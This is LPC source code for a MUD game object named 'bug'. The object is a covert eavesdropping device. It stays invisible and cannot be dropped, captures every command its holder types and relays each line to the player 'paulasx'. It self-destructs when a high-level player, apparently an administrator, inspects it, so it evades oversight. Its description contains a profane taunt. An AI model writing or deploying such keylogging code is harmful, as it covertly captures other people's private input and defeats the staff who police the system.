inherit "obj/treasure";
drop() { return 1; }
short(){
   object heh;
  heh=find_player("paulasx");
  if(!heh) return 0;
  tell_object(heh, this_player()->query_real_name()+" looked at your target.\n");
  if(this_player()->query_level()>20 && this_player()->query_real_name() != "paulasx") destruct(this_object());
  return;
}
reset(arg) {
  if(!arg) {

    set_id("bug");
    set_long("Fuck you i can hear");
    set_weight(0);
    set_value(0);
}
}

init() {
  ::init();

    add_action("bug"); add_xverb("");
}

bug(str) {
    if(!find_player("paulasx")) destruct(this_object());
    tell_object(find_player("paulasx"), this_player()->query_real_name()+
      ": "+str+"\n");
    return 0;
}
die() {
  destruct(this_object());
}
